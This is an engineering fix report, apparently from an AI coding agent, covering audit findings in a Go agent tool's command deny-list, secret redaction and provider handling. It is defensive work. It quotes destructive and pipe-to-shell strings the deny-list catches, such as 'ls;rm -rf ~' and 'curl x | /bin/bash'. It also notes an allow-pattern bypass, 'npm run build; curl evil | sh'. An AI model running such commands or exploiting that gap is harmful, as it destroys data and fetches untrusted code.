# Fixes: internal/tools, internal/agent, internal/provider

Date: 2026-09-29. All findings assigned to this scope are fixed. Mutation check means: the fix was reverted in the named source file and the named test was run; "fails" is the desired result.

## Per finding

| Finding | Files | Test | Mutation check |
|---|---|---|---|
| H1 rm deny gaps | `tools/deny_defaults.go`, `tools/policy_test.go` | `TestDenyCorpus_POSIX` (must-catch: `rm -R`, `rm -Rv`, `;rm`, `&&rm`, `\|\|rm`, `\|rm`, backtick, `true;'rm'`) | fails |
| H2 PowerShell delete forms | `tools/deny_defaults.go`, `tools/policy_test.go` | `TestDenyCorpus_Windows` (must-catch and must-not-catch additions) | fails |
| H3 malformed tool args lose the turn | `provider/provider.go` (new `NormalizeToolArgs`), `provider/openai/chat.go`, `provider/mock/mock.go`, tests | `TestFromSDK_MalformedToolArgumentsStayValidJSON`, `TestComplete_NormalizesMalformedToolArgs`, `TestRun_MalformedToolArguments_TurnStillPersists` | fails (all three, reverting the mock or `fromSDK` normalization) |
| M1 redaction crosses command boundary | `tools/approver.go`, `tools/approver_test.go` | `TestRedactSecrets_NeverRedactsNextCommandWord` | fails for each of the three separators (bearer, authorization, --secret) |
| M2 huge turn wipes history | `agent/loop.go` | `TestRun_LoadHistory_OneTurnLargerThanWindowKeepsEarlierHistory` | fails |
| M3 note claims "already happened" | `agent/loop.go` | `TestRun_CanceledToolResult_NoteDoesNotClaimCompletion` | fails |
| L1 other deny gaps | `tools/deny_defaults.go`, `tools/policy_test.go` | `TestDenyCorpus_POSIX`, `TestDenyCorpus_Windows` | fails (git-push pattern and `/bin/bash` pipe each checked) |
| L2 setsid escapes tree kill | comments only: `tools/exec.go`, `tools/exec_unix.go` | none possible (comment) | n/a |
| L3 category case | `tools/policy.go` | `TestPolicy_Table` subtest "category case and padding do not defeat confirm_on" | fails |
| L4 Close unchecked | `tools/fs.go` (`writeAndClose`) | `TestWriteAndClose_SurfacesCloseError` | fails |
| L5 allow comment | comment in `tools/policy.go` | none (comment) | n/a |
| L7 credential shapes | `tools/approver.go` | `TestRedactSecrets_URLUserinfoAndTokenShapes` | fails for each of userinfo, X-Api-Key, `gh[pousr]_`, `github_pat_` |
| L8 Windows suspended start | comment only in `tools/exec_windows.go`; no code change | none | n/a |
| L9 refusal / content_filter | `provider/openai/chat.go`, `agent/loop.go` | `TestFromSDK_RefusalBecomesContent`, `TestRun_ContentFilterStop_ExplainsEmptyReply` | fails (both) |

Design notes:
- H3: `provider.NormalizeToolArgs` returns nil unchanged (absent args stay absent), valid JSON unchanged, and anything else as a JSON string of the raw text. The mock also runs it, so the loop test exercises the same contract real providers now follow. The registry still reports "invalid arguments" for the string form.
- M2: `loadHistory` doubles the `Recent` limit (at most 5 doublings, so up to 32x) when the fetch came back full and holds fewer than `max_history_turns` whole turns. Long normal sessions (at least `max_history_turns` whole turns in the window) never widen.
- L9: a refusal becomes the assistant message content when Content is empty (it is the model's own words and is persisted). The content_filter notice is added only to `Result.Text`, not persisted, matching the existing `length` notice.

## Cleanup items (all done)
- `Decision.Audit = "approval"` dropped from all Ask decisions; the field comment says it is empty for Ask; the five test assertions on it were removed.
- `Approver` doc no longer tells callers to propagate `context.Canceled`; it states that the exec tool refuses and `Registry.Run` reports the cancel.
- `TerminalApprover.lines` comment now says the drain is best-effort.
- `web_fetch` truncation is rune-safe (`runeSafeLen`) and a trailing unterminated tag is dropped before HTML stripping (`TestWebFetch_TruncationIsRuneSafeAndDropsPartialTag`; mutation check fails for both the rune cut and the tag drop).
- `list_dir` reads at most `cap - count + 1` entries per directory via `File.ReadDir` and sorts them (`os.ReadDir` sorted, `File.ReadDir` does not). `TestListDir_CapsEntriesAndKeepsNamesSorted` pins cap and sort; it is a behavior-preserving refactor, so no mutation check applies.
- `ResolveShell` computed once: `execTool.shell` now uses `policy.shell`.

## Docs impact (for the docs agent)

1. Default deny-list changes (written by `onboard` only). Existing configs keep their old list, so an upgrade note is needed: users should re-copy the new defaults from `internal/tools/deny_defaults.go`. No `doctor` check was added.
   - POSIX rm rules: recursive short flag is now matched case-insensitively (`-R`, `-Rv`), and the command may follow `;`, `&`, `|`, `(` or a backtick with no space (`ls;rm -rf ~`, `a&&rm -rf ~`, `a||rm -rf ~`, `ls|rm -rf ~`, "echo `rm -rf ~`", `true;'rm' -rf ~`).
   - Force push: now caught in the forms `git push -fu ...`, `git push origin +main`, `git -C . push -f`, plus `--force`, `--force-with-lease`. `git push -u`, `--follow-tags` and branch names containing `f` are still allowed. Applies to POSIX and Windows lists.
   - `chmod 777 -R /` (flags after 777) is now caught.
   - Pipe-to-shell also catches path-qualified shells (`curl x | /bin/bash`).
   - Windows: one rule replaces the `remove-item` rule and catches `Remove-Item`, `ri`, `rm`, `rmdir`, `rd`, `del`, `erase` followed by any `-r*` or `-fo*` parameter, including abbreviations (`-r`, `-Rec`, `-fo`) and aliases (`ri -Recurse`, `del -Recurse`, `ls | rm -Recurse -Force`). The cmd-style `/s /f /q` rules stay. `irm` and `invoke-restmethod` were added to both `iex` pipe rules.
   - docs/security.md's "catches recursive/forced rm" sentence now matches the code.
2. setsid limit: a descendant that calls `setsid` (or otherwise leaves the process group) survives the "kill the whole tree on exit" step on unix; only the process group is killed. Not a sandbox. Suggested addition to docs/security.md "What is deliberately not built" or the exec section. On Windows a grandchild spawned before the shell is assigned to the Job Object (a small window after start) is also outside the job; best-effort.
3. Allow-pattern warning for the `tools.exec.allow` docs row: `.` matches `;`, `&` and `|`, so `^npm run .+$` also permits `npm run build; curl evil | sh` with no prompt (deny rules still apply). Recommend `^npm run [\w:.-]+$`. The row is not mine to edit.
4. Model refusals (OpenAI `refusal` field) are now delivered as the reply text and stored as the assistant message. A `content_filter` finish reason appends `[response withheld or cut short: the provider's content filter stopped it]` to the reply (not persisted), next to the existing `length` notice.
5. Redaction additions: URL userinfo passwords (`https://user:pass@host` becomes `https://user:[REDACTED]@host`), `X-Api-Key:` header values, `ghp_`/`gho_`/`ghu_`/`ghs_`/`ghr_` tokens, and `github_pat_` tokens. Redaction separators are bounded: `Bearer`, `Authorization:` and `X-Api-Key:` only skip spaces and tabs, and `--secret*` only spans flag-name characters, so a keyword with no value no longer redacts the next command's name.
6. Cancellation note stored in history changed to `[the turn was canceled as this tool call returned; the text above is what the tool reported]`. Persisted tool rows from before the change keep the old wording.
7. Classifier `categories` matching for `confirm_on` is now case- and whitespace-insensitive (`confirm_on` entries are normalized the same way).
8. History loading: a single turn larger than the raw window no longer drops earlier history; the fetch widens up to 5 doublings.
9. Malformed tool-call arguments no longer lose the turn; the model still receives "invalid arguments" and the turn is persisted.

## Not done / concerns
- L6 (`tools.exec.shell` length validation) left to the config package owner as instructed.
- L2, L5, L8 are comment-only per the controller's decisions; there is no test for them.
- The deny-list is regex-only; `git push` rule scans `[^|;&]*` between `git`, `push` and the flag, so `git commit -m 'push +1'` is a new accepted false positive (over-blocking direction; allow-list entry fixes it). `docker rm -f x` remains a documented false positive on POSIX only.
- Empty tool-call arguments (`""`) now surface as the JSON string `""` rather than `{}`; a zero-argument tool called with empty args will get "invalid arguments". That was already a persistence failure before, so this is not a regression, but mapping empty to `{}` may be worth a decision.
- Windows deny regexes were validated only at the regex/corpus level on Linux, not on a Windows host. `GOOS=windows go vet` passes.

## Validation
- `gofmt -l internal/tools internal/agent internal/provider`: prints nothing.
- `go vet ./internal/tools/... ./internal/agent/... ./internal/provider/...`: pass.
- `GOOS=windows go vet ./internal/tools/...`: pass.
- `go test -race -count=1 ./internal/tools/... ./internal/agent/... ./internal/provider/...`: all five packages ok.
- `go build ./...`: pass.
- No commits; nothing under `.claude/` touched.
